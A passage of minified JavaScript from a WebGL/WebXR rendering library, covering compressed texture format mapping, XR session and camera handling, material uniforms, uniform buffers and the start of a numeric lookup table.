t.ALPHA;if(i===G0)return t.RGB;if(i===jn)return t.RGBA;if(i===ki)return t.DEPTH_COMPONENT;if(i===Ls)return t.DEPTH_STENCIL;if(i===W0)return t.RED;if(i===ch)return t.RED_INTEGER;if(i===Ur)return t.RG;if(i===uh)return t.RG_INTEGER;if(i===dh)return t.RGBA_INTEGER;if(i===ll||i===cl||i===ul||i===dl)if(a===st)if(r=e.get("WEBGL_compressed_texture_s3tc_srgb"),r!==null){if(i===ll)return r.COMPRESSED_SRGB_S3TC_DXT1_EXT;if(i===cl)return r.COMPRESSED_SRGB_ALPHA_S3TC_DXT1_EXT;if(i===ul)return r.COMPRESSED_SRGB_ALPHA_S3TC_DXT3_EXT;if(i===dl)return r.COMPRESSED_SRGB_ALPHA_S3TC_DXT5_EXT}else return null;else if(r=e.get("WEBGL_compressed_texture_s3tc"),r!==null){if(i===ll)return r.COMPRESSED_RGB_S3TC_DXT1_EXT;if(i===cl)return r.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(i===ul)return r.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(i===dl)return r.COMPRESSED_RGBA_S3TC_DXT5_EXT}else return null;if(i===Ad||i===Cd||i===Rd||i===Pd)if(r=e.get("WEBGL_compressed_texture_pvrtc"),r!==null){if(i===Ad)return r.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(i===Cd)return r.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(i===Rd)return r.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(i===Pd)return r.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}else return null;if(i===Ld||i===kd||i===Nd||i===Dd||i===Id||i===Ud||i===Od)if(r=e.get("WEBGL_compressed_texture_etc"),r!==null){if(i===Ld||i===kd)return a===st?r.COMPRESSED_SRGB8_ETC2:r.COMPRESSED_RGB8_ETC2;if(i===Nd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ETC2_EAC:r.COMPRESSED_RGBA8_ETC2_EAC;if(i===Dd)return r.COMPRESSED_R11_EAC;if(i===Id)return r.COMPRESSED_SIGNED_R11_EAC;if(i===Ud)return r.COMPRESSED_RG11_EAC;if(i===Od)return r.COMPRESSED_SIGNED_RG11_EAC}else return null;if(i===Fd||i===Bd||i===zd||i===Vd||i===Hd||i===Gd||i===Wd||i===jd||i===Xd||i===qd||i===Yd||i===$d||i===Kd||i===Zd)if(r=e.get("WEBGL_compressed_texture_astc"),r!==null){if(i===Fd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_4x4_KHR:r.COMPRESSED_RGBA_ASTC_4x4_KHR;if(i===Bd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_5x4_KHR:r.COMPRESSED_RGBA_ASTC_5x4_KHR;if(i===zd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_5x5_KHR:r.COMPRESSED_RGBA_ASTC_5x5_KHR;if(i===Vd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_6x5_KHR:r.COMPRESSED_RGBA_ASTC_6x5_KHR;if(i===Hd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_6x6_KHR:r.COMPRESSED_RGBA_ASTC_6x6_KHR;if(i===Gd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_8x5_KHR:r.COMPRESSED_RGBA_ASTC_8x5_KHR;if(i===Wd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_8x6_KHR:r.COMPRESSED_RGBA_ASTC_8x6_KHR;if(i===jd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_8x8_KHR:r.COMPRESSED_RGBA_ASTC_8x8_KHR;if(i===Xd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x5_KHR:r.COMPRESSED_RGBA_ASTC_10x5_KHR;if(i===qd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x6_KHR:r.COMPRESSED_RGBA_ASTC_10x6_KHR;if(i===Yd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x8_KHR:r.COMPRESSED_RGBA_ASTC_10x8_KHR;if(i===$d)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x10_KHR:r.COMPRESSED_RGBA_ASTC_10x10_KHR;if(i===Kd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_12x10_KHR:r.COMPRESSED_RGBA_ASTC_12x10_KHR;if(i===Zd)return a===st?r.COMPRESSED_SRGB8_ALPHA8_ASTC_12x12_KHR:r.COMPRESSED_RGBA_ASTC_12x12_KHR}else return null;if(i===Jd||i===Qd||i===ep)if(r=e.get("EXT_texture_compression_bptc"),r!==null){if(i===Jd)return a===st?r.COMPRESSED_SRGB_ALPHA_BPTC_UNORM_EXT:r.COMPRESSED_RGBA_BPTC_UNORM_EXT;if(i===Qd)return r.COMPRESSED_RGB_BPTC_SIGNED_FLOAT_EXT;if(i===ep)return r.COMPRESSED_RGB_BPTC_UNSIGNED_FLOAT_EXT}else return null;if(i===tp||i===np||i===ip||i===sp)if(r=e.get("EXT_texture_compression_rgtc"),r!==null){if(i===tp)return r.COMPRESSED_RED_RGTC1_EXT;if(i===np)return r.COMPRESSED_SIGNED_RED_RGTC1_EXT;if(i===ip)return r.COMPRESSED_RED_GREEN_RGTC2_EXT;if(i===sp)return r.COMPRESSED_SIGNED_RED_GREEN_RGTC2_EXT}else return null;return i===Xa?t.UNSIGNED_INT_24_8:t[i]!==void 0?t[i]:null}return{convert:n}}const WA=`
void main() {

	gl_Position = vec4( position, 1.0 );

}`,jA=`
uniform sampler2DArray depthColor;
uniform float depthWidth;
uniform float depthHeight;

void main() {

	vec2 coord = vec2( gl_FragCoord.x / depthWidth, gl_FragCoord.y / depthHeight );

	if ( coord.x >= 1.0 ) {

		gl_FragDepth = texture( depthColor, vec3( coord.x - 1.0, coord.y, 1 ) ).r;

	} else {

		gl_FragDepth = texture( depthColor, vec3( coord.x, coord.y, 0 ) ).r;

	}

}`;class XA{constructor(){this.texture=null,this.mesh=null,this.depthNear=0,this.depthFar=0}init(e,n){if(this.texture===null){const i=new r_(e.texture);(e.depthNear!==n.depthNear||e.depthFar!==n.depthFar)&&(this.depthNear=e.depthNear,this.depthFar=e.depthFar),this.texture=i}}getMesh(e){if(this.texture!==null&&this.mesh===null){const n=e.cameras[0].viewport,i=new ui({vertexShader:WA,fragmentShader:jA,uniforms:{depthColor:{value:this.texture},depthWidth:{value:n.z},depthHeight:{value:n.w}}});this.mesh=new Ot(new ao(20,20),i)}return this.mesh}reset(){this.texture=null,this.mesh=null}getDepthTexture(){return this.texture}}class qA extends Gr{constructor(e,n){super();const i=this;let s=null,r=1,a=null,o="local-floor",l=1,c=null,d=null,p=null,h=null,f=null,_=null;const y=typeof XRWebGLBinding<"u",m=new XA,u={},g=n.getContextAttributes();let x=null,S=null;const T=[],A=[],R=new et;let N=null;const b=new un;b.viewport=new Mt;const w=new un;w.viewport=new Mt;const P=[b,w],z=new nM;let V=null,Z=null;this.cameraAutoUpdate=!0,this.enabled=!1,this.isPresenting=!1,this.getController=function(q){let O=T[q];return O===void 0&&(O=new cu,T[q]=O),O.getTargetRaySpace()},this.getControllerGrip=function(q){let O=T[q];return O===void 0&&(O=new cu,T[q]=O),O.getGripSpace()},this.getHand=function(q){let O=T[q];return O===void 0&&(O=new cu,T[q]=O),O.getHandSpace()};function $(q){const O=A.indexOf(q.inputSource);if(O===-1)return;const ge=T[O];ge!==void 0&&(ge.update(q.inputSource,q.frame,c||a),ge.dispatchEvent({type:q.type,data:q.inputSource}))}function X(){s.removeEventListener("select",$),s.removeEventListener("selectstart",$),s.removeEventListener("selectend",$),s.removeEventListener("squeeze",$),s.removeEventListener("squeezestart",$),s.removeEventListener("squeezeend",$),s.removeEventListener("end",X),s.removeEventListener("inputsourceschange",H);for(let q=0;q<T.length;q++){const O=A[q];O!==null&&(A[q]=null,T[q].disconnect(O))}V=null,Z=null,m.reset();for(const q in u)delete u[q];e.setRenderTarget(x),f=null,h=null,p=null,s=null,S=null,Ke.stop(),i.isPresenting=!1,e.setPixelRatio(N),e.setSize(R.width,R.height,!1),i.dispatchEvent({type:"sessionend"})}this.setFramebufferScaleFactor=function(q){r=q,i.isPresenting===!0&&Ne("WebXRManager: Cannot change framebuffer scale while presenting.")},this.setReferenceSpaceType=function(q){o=q,i.isPresenting===!0&&Ne("WebXRManager: Cannot change reference space type while presenting.")},this.getReferenceSpace=function(){return c||a},this.setReferenceSpace=function(q){c=q},this.getBaseLayer=function(){return h!==null?h:f},this.getBinding=function(){return p===null&&y&&(p=new XRWebGLBinding(s,n)),p},this.getFrame=function(){return _},this.getSession=function(){return s},this.setSession=async function(q){if(s=q,s!==null){if(x=e.getRenderTarget(),s.addEventListener("select",$),s.addEventListener("selectstart",$),s.addEventListener("selectend",$),s.addEventListener("squeeze",$),s.addEventListener("squeezestart",$),s.addEventListener("squeezeend",$),s.addEventListener("end",X),s.addEventListener("inputsourceschange",H),g.xrCompatible!==!0&&await n.makeXRCompatible(),N=e.getPixelRatio(),e.getSize(R),y&&"createProjectionLayer"in XRWebGLBinding.prototype){let ge=null,Ue=null,ye=null;g.depth&&(ye=g.stencil?n.DEPTH24_STENCIL8:n.DEPTH_COMPONENT24,ge=g.stencil?Ls:ki,Ue=g.stencil?Xa:li);const Xe={colorFormat:n.RGBA8,depthFormat:ye,scaleFactor:r};p=this.getBinding(),h=p.createProjectionLayer(Xe),s.updateRenderState({layers:[h]}),e.setPixelRatio(1),e.setSize(h.textureWidth,h.textureHeight,!1),S=new ai(h.textureWidth,h.textureHeight,{format:jn,type:Sn,depthTexture:new Ya(h.textureWidth,h.textureHeight,Ue,void 0,void 0,void 0,void 0,void 0,void 0,ge),stencilBuffer:g.stencil,colorSpace:e.outputColorSpace,samples:g.antialias?4:0,resolveDepthBuffer:h.ignoreDepthValues===!1,resolveStencilBuffer:h.ignoreDepthValues===!1})}else{const ge={antialias:g.antialias,alpha:!0,depth:g.depth,stencil:g.stencil,framebufferScaleFactor:r};f=new XRWebGLLayer(s,n,ge),s.updateRenderState({baseLayer:f}),e.setPixelRatio(1),e.setSize(f.framebufferWidth,f.framebufferHeight,!1),S=new ai(f.framebufferWidth,f.framebufferHeight,{format:jn,type:Sn,colorSpace:e.outputColorSpace,stencilBuffer:g.stencil,resolveDepthBuffer:f.ignoreDepthValues===!1,resolveStencilBuffer:f.ignoreDepthValues===!1})}S.isXRRenderTarget=!0,this.setFoveation(l),c=null,a=await s.requestReferenceSpace(o),Ke.setContext(s),Ke.start(),i.isPresenting=!0,i.dispatchEvent({type:"sessionstart"})}},this.getEnvironmentBlendMode=function(){if(s!==null)return s.environmentBlendMode},this.getDepthTexture=function(){return m.getDepthTexture()};function H(q){for(let O=0;O<q.removed.length;O++){const ge=q.removed[O],Ue=A.indexOf(ge);Ue>=0&&(A[Ue]=null,T[Ue].disconnect(ge))}for(let O=0;O<q.added.length;O++){const ge=q.added[O];let Ue=A.indexOf(ge);if(Ue===-1){for(let Xe=0;Xe<T.length;Xe++)if(Xe>=A.length){A.push(ge),Ue=Xe;break}else if(A[Xe]===null){A[Xe]=ge,Ue=Xe;break}if(Ue===-1)break}const ye=T[Ue];ye&&ye.connect(ge)}}const I=new B,J=new B;function K(q,O,ge){I.setFromMatrixPosition(O.matrixWorld),J.setFromMatrixPosition(ge.matrixWorld);const Ue=I.distanceTo(J),ye=O.projectionMatrix.elements,Xe=ge.projectionMatrix.elements,Tt=ye[14]/(ye[10]-1),Ve=ye[14]/(ye[10]+1),qe=(ye[9]+1)/ye[5],tt=(ye[9]-1)/ye[5],Oe=(ye[8]-1)/ye[0],pt=(Xe[8]+1)/Xe[0],k=Tt*Oe,yt=Tt*pt,Ze=Ue/(-Oe+pt),at=Ze*-Oe;if(O.matrixWorld.decompose(q.position,q.quaternion,q.scale),q.translateX(at),q.translateZ(Ze),q.matrixWorld.compose(q.position,q.quaternion,q.scale),q.matrixWorldInverse.copy(q.matrixWorld).invert(),ye[10]===-1)q.projectionMatrix.copy(O.projectionMatrix),q.projectionMatrixInverse.copy(O.projectionMatrixInverse);else{const Se=Tt+Ze,C=Ve+Ze,v=k-at,L=yt+(Ue-at),Y=qe*Ve/C*Se,Q=tt*Ve/C*Se;q.projectionMatrix.makePerspective(v,L,Y,Q,Se,C),q.projectionMatrixInverse.copy(q.projectionMatrix).invert()}}function ne(q,O){O===null?q.matrixWorld.copy(q.matrix):q.matrixWorld.multiplyMatrices(O.matrixWorld,q.matrix),q.matrixWorldInverse.copy(q.matrixWorld).invert()}this.updateCamera=function(q){if(s===null)return;let O=q.near,ge=q.far;m.texture!==null&&(m.depthNear>0&&(O=m.depthNear),m.depthFar>0&&(ge=m.depthFar)),z.near=w.near=b.near=O,z.far=w.far=b.far=ge,(V!==z.near||Z!==z.far)&&(s.updateRenderState({depthNear:z.near,depthFar:z.far}),V=z.near,Z=z.far),z.layers.mask=q.layers.mask|6,b.layers.mask=z.layers.mask&3,w.layers.mask=z.layers.mask&5;const Ue=q.parent,ye=z.cameras;ne(z,Ue);for(let Xe=0;Xe<ye.length;Xe++)ne(ye[Xe],Ue);ye.length===2?K(z,b,w):z.projectionMatrix.copy(b.projectionMatrix),we(q,z,Ue)};function we(q,O,ge){ge===null?q.matrix.copy(O.matrixWorld):(q.matrix.copy(ge.matrixWorld),q.matrix.invert(),q.matrix.multiply(O.matrixWorld)),q.matrix.decompose(q.position,q.quaternion,q.scale),q.updateMatrixWorld(!0),q.projectionMatrix.copy(O.projectionMatrix),q.projectionMatrixInverse.copy(O.projectionMatrixInverse),q.isPerspectiveCamera&&(q.fov=rp*2*Math.atan(1/q.projectionMatrix.elements[5]),q.zoom=1)}this.getCamera=function(){return z},this.getFoveation=function(){if(!(h===null&&f===null))return l},this.setFoveation=function(q){l=q,h!==null&&(h.fixedFoveation=q),f!==null&&f.fixedFoveation!==void 0&&(f.fixedFoveation=q)},this.hasDepthSensing=function(){return m.texture!==null},this.getDepthSensingMesh=function(){return m.getMesh(z)},this.getCameraTexture=function(q){return u[q]};let Pe=null;function Ge(q,O){if(d=O.getViewerPose(c||a),_=O,d!==null){const ge=d.views;f!==null&&(e.setRenderTargetFramebuffer(S,f.framebuffer),e.setRenderTarget(S));let Ue=!1;ge.length!==z.cameras.length&&(z.cameras.length=0,Ue=!0);for(let Ve=0;Ve<ge.length;Ve++){const qe=ge[Ve];let tt=null;if(f!==null)tt=f.getViewport(qe);else{const pt=p.getViewSubImage(h,qe);tt=pt.viewport,Ve===0&&(e.setRenderTargetTextures(S,pt.colorTexture,pt.depthStencilTexture),e.setRenderTarget(S))}let Oe=P[Ve];Oe===void 0&&(Oe=new un,Oe.layers.enable(Ve),Oe.viewport=new Mt,P[Ve]=Oe),Oe.matrix.fromArray(qe.transform.matrix),Oe.matrix.decompose(Oe.position,Oe.quaternion,Oe.scale),Oe.projectionMatrix.fromArray(qe.projectionMatrix),Oe.projectionMatrixInverse.copy(Oe.projectionMatrix).invert(),Oe.viewport.set(tt.x,tt.y,tt.width,tt.height),Ve===0&&(z.matrix.copy(Oe.matrix),z.matrix.decompose(z.position,z.quaternion,z.scale)),Ue===!0&&z.cameras.push(Oe)}const ye=s.enabledFeatures;if(ye&&ye.includes("depth-sensing")&&s.depthUsage=="gpu-optimized"&&y){p=i.getBinding();const Ve=p.getDepthInformation(ge[0]);Ve&&Ve.isValid&&Ve.texture&&m.init(Ve,s.renderState)}if(ye&&ye.includes("camera-access")&&y){e.state.unbindTexture(),p=i.getBinding();for(let Ve=0;Ve<ge.length;Ve++){const qe=ge[Ve].camera;if(qe){let tt=u[qe];tt||(tt=new r_,u[qe]=tt);const Oe=p.getCameraImage(qe);tt.sourceTexture=Oe}}}}for(let ge=0;ge<T.length;ge++){const Ue=A[ge],ye=T[ge];Ue!==null&&ye!==void 0&&ye.update(Ue,O,c||a)}Pe&&Pe(q,O),O.detectedPlanes&&i.dispatchEvent({type:"planesdetected",data:O}),_=null}const Ke=new d_;Ke.setAnimationLoop(Ge),this.setAnimationLoop=function(q){Pe=q},this.dispose=function(){}}}const Ss=new ci,YA=new _t;function $A(t,e){function n(m,u){m.matrixAutoUpdate===!0&&m.updateMatrix(),u.value.copy(m.matrix)}function i(m,u){u.color.getRGB(m.fogColor.value,Q0(t)),u.isFog?(m.fogNear.value=u.near,m.fogFar.value=u.far):u.isFogExp2&&(m.fogDensity.value=u.density)}function s(m,u,g,x,S){u.isMeshBasicMaterial||u.isMeshLambertMaterial?r(m,u):u.isMeshToonMaterial?(r(m,u),p(m,u)):u.isMeshPhongMaterial?(r(m,u),d(m,u)):u.isMeshStandardMaterial?(r(m,u),h(m,u),u.isMeshPhysicalMaterial&&f(m,u,S)):u.isMeshMatcapMaterial?(r(m,u),_(m,u)):u.isMeshDepthMaterial?r(m,u):u.isMeshDistanceMaterial?(r(m,u),y(m,u)):u.isMeshNormalMaterial?r(m,u):u.isLineBasicMaterial?(a(m,u),u.isLineDashedMaterial&&o(m,u)):u.isPointsMaterial?l(m,u,g,x):u.isSpriteMaterial?c(m,u):u.isShadowMaterial?(m.color.value.copy(u.color),m.opacity.value=u.opacity):u.isShaderMaterial&&(u.uniformsNeedUpdate=!1)}function r(m,u){m.opacity.value=u.opacity,u.color&&m.diffuse.value.copy(u.color),u.emissive&&m.emissive.value.copy(u.emissive).multiplyScalar(u.emissiveIntensity),u.map&&(m.map.value=u.map,n(u.map,m.mapTransform)),u.alphaMap&&(m.alphaMap.value=u.alphaMap,n(u.alphaMap,m.alphaMapTransform)),u.bumpMap&&(m.bumpMap.value=u.bumpMap,n(u.bumpMap,m.bumpMapTransform),m.bumpScale.value=u.bumpScale,u.side===mn&&(m.bumpScale.value*=-1)),u.normalMap&&(m.normalMap.value=u.normalMap,n(u.normalMap,m.normalMapTransform),m.normalScale.value.copy(u.normalScale),u.side===mn&&m.normalScale.value.negate()),u.displacementMap&&(m.displacementMap.value=u.displacementMap,n(u.displacementMap,m.displacementMapTransform),m.displacementScale.value=u.displacementScale,m.displacementBias.value=u.displacementBias),u.emissiveMap&&(m.emissiveMap.value=u.emissiveMap,n(u.emissiveMap,m.emissiveMapTransform)),u.specularMap&&(m.specularMap.value=u.specularMap,n(u.specularMap,m.specularMapTransform)),u.alphaTest>0&&(m.alphaTest.value=u.alphaTest);const g=e.get(u),x=g.envMap,S=g.envMapRotation;x&&(m.envMap.value=x,Ss.copy(S),Ss.x*=-1,Ss.y*=-1,Ss.z*=-1,x.isCubeTexture&&x.isRenderTargetTexture===!1&&(Ss.y*=-1,Ss.z*=-1),m.envMapRotation.value.setFromMatrix4(YA.makeRotationFromEuler(Ss)),m.flipEnvMap.value=x.isCubeTexture&&x.isRenderTargetTexture===!1?-1:1,m.reflectivity.value=u.reflectivity,m.ior.value=u.ior,m.refractionRatio.value=u.refractionRatio),u.lightMap&&(m.lightMap.value=u.lightMap,m.lightMapIntensity.value=u.lightMapIntensity,n(u.lightMap,m.lightMapTransform)),u.aoMap&&(m.aoMap.value=u.aoMap,m.aoMapIntensity.value=u.aoMapIntensity,n(u.aoMap,m.aoMapTransform))}function a(m,u){m.diffuse.value.copy(u.color),m.opacity.value=u.opacity,u.map&&(m.map.value=u.map,n(u.map,m.mapTransform))}function o(m,u){m.dashSize.value=u.dashSize,m.totalSize.value=u.dashSize+u.gapSize,m.scale.value=u.scale}function l(m,u,g,x){m.diffuse.value.copy(u.color),m.opacity.value=u.opacity,m.size.value=u.size*g,m.scale.value=x*.5,u.map&&(m.map.value=u.map,n(u.map,m.uvTransform)),u.alphaMap&&(m.alphaMap.value=u.alphaMap,n(u.alphaMap,m.alphaMapTransform)),u.alphaTest>0&&(m.alphaTest.value=u.alphaTest)}function c(m,u){m.diffuse.value.copy(u.color),m.opacity.value=u.opacity,m.rotation.value=u.rotation,u.map&&(m.map.value=u.map,n(u.map,m.mapTransform)),u.alphaMap&&(m.alphaMap.value=u.alphaMap,n(u.alphaMap,m.alphaMapTransform)),u.alphaTest>0&&(m.alphaTest.value=u.alphaTest)}function d(m,u){m.specular.value.copy(u.specular),m.shininess.value=Math.max(u.shininess,1e-4)}function p(m,u){u.gradientMap&&(m.gradientMap.value=u.gradientMap)}function h(m,u){m.metalness.value=u.metalness,u.metalnessMap&&(m.metalnessMap.value=u.metalnessMap,n(u.metalnessMap,m.metalnessMapTransform)),m.roughness.value=u.roughness,u.roughnessMap&&(m.roughnessMap.value=u.roughnessMap,n(u.roughnessMap,m.roughnessMapTransform)),u.envMap&&(m.envMapIntensity.value=u.envMapIntensity)}function f(m,u,g){m.ior.value=u.ior,u.sheen>0&&(m.sheenColor.value.copy(u.sheenColor).multiplyScalar(u.sheen),m.sheenRoughness.value=u.sheenRoughness,u.sheenColorMap&&(m.sheenColorMap.value=u.sheenColorMap,n(u.sheenColorMap,m.sheenColorMapTransform)),u.sheenRoughnessMap&&(m.sheenRoughnessMap.value=u.sheenRoughnessMap,n(u.sheenRoughnessMap,m.sheenRoughnessMapTransform))),u.clearcoat>0&&(m.clearcoat.value=u.clearcoat,m.clearcoatRoughness.value=u.clearcoatRoughness,u.clearcoatMap&&(m.clearcoatMap.value=u.clearcoatMap,n(u.clearcoatMap,m.clearcoatMapTransform)),u.clearcoatRoughnessMap&&(m.clearcoatRoughnessMap.value=u.clearcoatRoughnessMap,n(u.clearcoatRoughnessMap,m.clearcoatRoughnessMapTransform)),u.clearcoatNormalMap&&(m.clearcoatNormalMap.value=u.clearcoatNormalMap,n(u.clearcoatNormalMap,m.clearcoatNormalMapTransform),m.clearcoatNormalScale.value.copy(u.clearcoatNormalScale),u.side===mn&&m.clearcoatNormalScale.value.negate())),u.dispersion>0&&(m.dispersion.value=u.dispersion),u.iridescence>0&&(m.iridescence.value=u.iridescence,m.iridescenceIOR.value=u.iridescenceIOR,m.iridescenceThicknessMinimum.value=u.iridescenceThicknessRange[0],m.iridescenceThicknessMaximum.value=u.iridescenceThicknessRange[1],u.iridescenceMap&&(m.iridescenceMap.value=u.iridescenceMap,n(u.iridescenceMap,m.iridescenceMapTransform)),u.iridescenceThicknessMap&&(m.iridescenceThicknessMap.value=u.iridescenceThicknessMap,n(u.iridescenceThicknessMap,m.iridescenceThicknessMapTransform))),u.transmission>0&&(m.transmission.value=u.transmission,m.transmissionSamplerMap.value=g.texture,m.transmissionSamplerSize.value.set(g.width,g.height),u.transmissionMap&&(m.transmissionMap.value=u.transmissionMap,n(u.transmissionMap,m.transmissionMapTransform)),m.thickness.value=u.thickness,u.thicknessMap&&(m.thicknessMap.value=u.thicknessMap,n(u.thicknessMap,m.thicknessMapTransform)),m.attenuationDistance.value=u.attenuationDistance,m.attenuationColor.value.copy(u.attenuationColor)),u.anisotropy>0&&(m.anisotropyVector.value.set(u.anisotropy*Math.cos(u.anisotropyRotation),u.anisotropy*Math.sin(u.anisotropyRotation)),u.anisotropyMap&&(m.anisotropyMap.value=u.anisotropyMap,n(u.anisotropyMap,m.anisotropyMapTransform))),m.specularIntensity.value=u.specularIntensity,m.specularColor.value.copy(u.specularColor),u.specularColorMap&&(m.specularColorMap.value=u.specularColorMap,n(u.specularColorMap,m.specularColorMapTransform)),u.specularIntensityMap&&(m.specularIntensityMap.value=u.specularIntensityMap,n(u.specularIntensityMap,m.specularIntensityMapTransform))}function _(m,u){u.matcap&&(m.matcap.value=u.matcap)}function y(m,u){const g=e.get(u).light;m.referencePosition.value.setFromMatrixPosition(g.matrixWorld),m.nearDistance.value=g.shadow.camera.near,m.farDistance.value=g.shadow.camera.far}return{refreshFogUniforms:i,refreshMaterialUniforms:s}}function KA(t,e,n,i){let s={},r={},a=[];const o=t.getParameter(t.MAX_UNIFORM_BUFFER_BINDINGS);function l(g,x){const S=x.program;i.uniformBlockBinding(g,S)}function c(g,x){let S=s[g.id];S===void 0&&(_(g),S=d(g),s[g.id]=S,g.addEventListener("dispose",m));const T=x.program;i.updateUBOMapping(g,T);const A=e.render.frame;r[g.id]!==A&&(h(g),r[g.id]=A)}function d(g){const x=p();g.__bindingPointIndex=x;const S=t.createBuffer(),T=g.__size,A=g.usage;return t.bindBuffer(t.UNIFORM_BUFFER,S),t.bufferData(t.UNIFORM_BUFFER,T,A),t.bindBuffer(t.UNIFORM_BUFFER,null),t.bindBufferBase(t.UNIFORM_BUFFER,x,S),S}function p(){for(let g=0;g<o;g++)if(a.indexOf(g)===-1)return a.push(g),g;return Qe("WebGLRenderer: Maximum number of simultaneously usable uniforms groups reached."),0}function h(g){const x=s[g.id],S=g.uniforms,T=g.__cache;t.bindBuffer(t.UNIFORM_BUFFER,x);for(let A=0,R=S.length;A<R;A++){const N=Array.isArray(S[A])?S[A]:[S[A]];for(let b=0,w=N.length;b<w;b++){const P=N[b];if(f(P,A,b,T)===!0){const z=P.__offset,V=Array.isArray(P.value)?P.value:[P.value];let Z=0;for(let $=0;$<V.length;$++){const X=V[$],H=y(X);typeof X=="number"||typeof X=="boolean"?(P.__data[0]=X,t.bufferSubData(t.UNIFORM_BUFFER,z+Z,P.__data)):X.isMatrix3?(P.__data[0]=X.elements[0],P.__data[1]=X.elements[1],P.__data[2]=X.elements[2],P.__data[3]=0,P.__data[4]=X.elements[3],P.__data[5]=X.elements[4],P.__data[6]=X.elements[5],P.__data[7]=0,P.__data[8]=X.elements[6],P.__data[9]=X.elements[7],P.__data[10]=X.elements[8],P.__data[11]=0):(X.toArray(P.__data,Z),Z+=H.storage/Float32Array.BYTES_PER_ELEMENT)}t.bufferSubData(t.UNIFORM_BUFFER,z,P.__data)}}}t.bindBuffer(t.UNIFORM_BUFFER,null)}function f(g,x,S,T){const A=g.value,R=x+"_"+S;if(T[R]===void 0)return typeof A=="number"||typeof A=="boolean"?T[R]=A:T[R]=A.clone(),!0;{const N=T[R];if(typeof A=="number"||typeof A=="boolean"){if(N!==A)return T[R]=A,!0}else if(N.equals(A)===!1)return N.copy(A),!0}return!1}function _(g){const x=g.uniforms;let S=0;const T=16;for(let R=0,N=x.length;R<N;R++){const b=Array.isArray(x[R])?x[R]:[x[R]];for(let w=0,P=b.length;w<P;w++){const z=b[w],V=Array.isArray(z.value)?z.value:[z.value];for(let Z=0,$=V.length;Z<$;Z++){const X=V[Z],H=y(X),I=S%T,J=I%H.boundary,K=I+J;S+=J,K!==0&&T-K<H.storage&&(S+=T-K),z.__data=new Float32Array(H.storage/Float32Array.BYTES_PER_ELEMENT),z.__offset=S,S+=H.storage}}}const A=S%T;return A>0&&(S+=T-A),g.__size=S,g.__cache={},this}function y(g){const x={boundary:0,storage:0};return typeof g=="number"||typeof g=="boolean"?(x.boundary=4,x.storage=4):g.isVector2?(x.boundary=8,x.storage=8):g.isVector3||g.isColor?(x.boundary=16,x.storage=12):g.isVector4?(x.boundary=16,x.storage=16):g.isMatrix3?(x.boundary=48,x.storage=48):g.isMatrix4?(x.boundary=64,x.storage=64):g.isTexture?Ne("WebGLRenderer: Texture samplers can not be part of an uniforms group."):Ne("WebGLRenderer: Unsupported uniform value type.",g),x}function m(g){const x=g.target;x.removeEventListener("dispose",m);const S=a.indexOf(x.__bindingPointIndex);a.splice(S,1),t.deleteBuffer(s[x.id]),delete s[x.id],delete r[x.id]}function u(){for(const g in s)t.deleteBuffer(s[g]);a=[],s={},r={}}return{bind:l,update:c,dispose:u}}const ZA=new Uint16Array([12469,15057,12620,14925,13266,14620,13807,14376,14323,13990,14545,13625,14713,13328,14840,12882,14931,12528,14996,12233,15039,11829,15066,11525,15080,11295,15085,10976,15082,10705,15073,10495,13880,14564,13898,14542,13977,14430,14158,14124,14393,13732,14556,13410,14702,12996,14814,12596,14891,12291,14937,11834,14957,11489,14958,11194,14943,10803,14921,10506,14893,10278,14858,9960,14484,14039,14487,14025,14499,13941,14524,13740,14574,13468,14654,13106,14743,12678,14818,12344,14867,11893,14889,11509,14893,11180,14881,10751,14852,10428,14812,10128,14765,9754,14712,9466,14764,13480,14764,13475,14766,13440,14766,13347,14769,13070,14786,12713,14816,12387,14844,11957,14860,11549,14868,11215,14855,10751,14825,10403,14782,10044,14729,9651,14666,9352,14599,9029,14967,12835,14966,12831,14963,12804,14954,12723,14936,12564,14917,12347,14900,11958,14886,11569,14878,11247,14859,10765,14828,10401,14784,10011,14727,9600,14660,9289,14586,8893,14508,8533,15111,12234,15110,12234,15104,12216,15092,12156,15067,12010,15028,11776,14981,11500,14942,11205,14902,10752,14861,10393,14812,9991,14752,9570,14682,9252,14603,8808,14519,8445,14431,8145,15209,11449,15208,11451,15202,11451,15190,11438,15163,11384,15117,11274,15055,10979,14994,10648,14932,10343,14871,9936,14803,9532,14729,9218,14645,8742,14556,8381,14461,8020,14365,7603,15273,10603,15272,10607,15267,10619,15256,10631,15231,10614,15182,10535,15118,10389,15042,10167,14963,9787,14883,9447,14800,9115,14710,8665,14615,8318,14514,7911,14411,7507,14279,7198,15314,9675,15313,9683,15309,9712,15298,9759,15277,9797,15229,9773,15166,9668,15084,9487,14995,9274,14898,8910,14800,8539,14697,8234,14590,7790,14479,7409,14367,7067,14178,6621,15337,8619,15337,8631,15333,8677,15325,8769,15305,8871,15264,8940,15202,8909,15119,8775,15022,8565,14916,8328,14804,8009,14688,7614,14569,7287,14448,6888,14321,6483,14088,6171,15350,7402,15350,7419,15347,7480,15340,7613,15322,7804,15287,7973,15229,8057,15148,8012,15046,7846,14933,7611,14810,7357,14682,7069,14552,6656,14421,6316,14251,5948,14007,5528,15356,5942,15356,5977,15353,6119,15348,6294,15332,6551,15302,6824,15249,7044,15171,7122,15070,7050,14949,6861,14818,6611,14679,6349,14538,6067,14398,5651,14189,5311,13935,4958,15359,4123,15359,4153,15356,4296,15353,4646,15338,5160,15311,5508,15263,5829,15188,6042,15088,6094,14966,6001